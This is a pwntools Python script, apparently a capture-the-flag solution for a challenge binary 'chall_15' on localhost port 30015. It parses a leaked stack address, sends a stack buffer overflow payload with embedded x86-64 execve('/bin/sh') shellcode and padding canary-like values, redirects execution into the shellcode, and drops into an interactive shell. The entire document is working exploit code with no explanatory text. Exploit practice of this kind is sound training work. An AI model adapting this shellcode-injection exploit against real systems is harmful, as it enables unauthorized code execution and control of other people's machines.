from pwn import *

target = remote("localhost", 30015)
# target = process("./chall_15")
# gdb.attach(target)

target.sendline(b"0000")

leak = target.recvline().split(b": ")[1].strip(b"\n")
leak = int(leak, 16)

print("leak is: %s" % hex(leak))

payload = b""
payload += 0x0a*b"0"
payload += p64(0xfacade)
payload += b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload += b"0"*(0x42 - len(payload))
payload += p64(0xfacade)

payload += b"0"*(0x4e - len(payload))
payload += p64(leak + 0xa + 0x8)

target.sendline(payload)

target.interactive()
